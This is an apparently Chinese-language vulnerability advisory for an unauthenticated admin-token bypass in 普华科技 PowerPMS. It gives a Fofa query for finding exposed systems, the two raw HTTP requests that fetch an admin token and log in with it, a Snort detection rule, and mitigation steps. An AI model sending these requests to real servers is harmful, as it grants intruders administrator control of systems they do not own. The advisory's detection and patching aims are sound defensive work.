# 普华PMS-BatchHandleFeedBackRecord-权限绕过

普华PMS-BatchHandleFeedBackRecord-权限绕过，可以获得admin管理员权限。

# 影响版本

普华科技-PowerPMS 至今全版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa: app=&quot;普华科技-PowerPMS&quot; || body=&quot;Power.login.init&quot; &amp;&amp; body=&quot;Power.ui.warning&quot; &amp;&amp; body=&quot;Power_login_btn&quot;**

**POC/EXP：**

**step1 获取可用admin token**

```
GET /Plan/BatchHandleFeedBackRecord/ HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9


```

​![image](assets/image-20260822145141-azhjkns.png)​

**step2 使用admin token登录后台**

```
GET /WebCenter/Open/ HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: shPower_TOKEN=[value]


```

​![image](assets/image-20260822145111-7ov5379.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"普华PMS - BatchHandleFeedBackRecord 权限绕过漏洞 (Unauthenticated Access to /WebCenter/Open/)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/WebCenter/Open/"; fast_pattern;
    metadata:
        service http,
        affected_product "普华PMS",
        vulnerability_type "Permission Bypass",
        severity "high";
    classtype:web-application-attack;
    sid:1000728;
    rev:1;
    priority:2;
)
```

# 漏洞修复

在官方补丁发布前，建议采取以下措施：

1. **日志排查**：检查Web服务器日志，寻找对`/Plan/BatchHandleFeedBackRecord`​接口的异常访问请求。
2. **部署WAF规则**：在Web应用防火墙（WAF）上添加规则，**拦截或限制对**​ **​`/Plan/BatchHandleFeedBackRecord`​**​**接口的访问**。
3. **网络访问控制**：在防火墙上设置策略，**限制管理系统只能从内网或特定可信IP访问**，避免直接暴露在公网。

‍
